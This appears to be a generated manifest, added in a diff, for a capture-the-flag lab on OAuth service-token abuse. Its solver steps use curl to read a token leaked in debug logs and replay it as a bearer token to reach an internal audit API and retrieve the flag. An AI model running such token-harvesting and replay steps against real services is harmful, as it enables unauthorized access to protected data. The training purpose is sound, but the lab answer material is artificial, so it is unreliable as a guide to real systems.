@@ -1,0 +1,36 @@
+# Generated from platform/labs/Identity/identity-1-3-nhi-oauth-abuse/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: identity-1-3-nhi-oauth-abuse
+track: Identity
+difficulty: intermediate
+source: platform/labs/Identity/identity-1-3-nhi-oauth-abuse/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 8080
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr-tester:latest
+  command: /tests/identity-1-3-nhi-oauth-abuse.sh
+  steps:
+  - name: Service health endpoint responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.nhi}:8080/health
+    expect: '200'
+  - name: Debug logs expose a service token
+    command: curl -s http://{target.nhi}:8080/api/logs
+    expect: ocr-svc-trailguard
+  - name: Audit API rejects an anonymous request
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.nhi}:8080/api/internal/audit
+    expect: '401'
+  - name: Leaked token reads the client audit records
+    command: 'curl -s -H ''Authorization: Bearer ocr-svc-trailguard-7c1e4a9b'' http://{target.nhi}:8080/api/internal/audit'
+    expect: '{flag}'
+expected_flag_count: 1
+expected_flag: '{flag}'
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 384
+max_cpu: 0.4
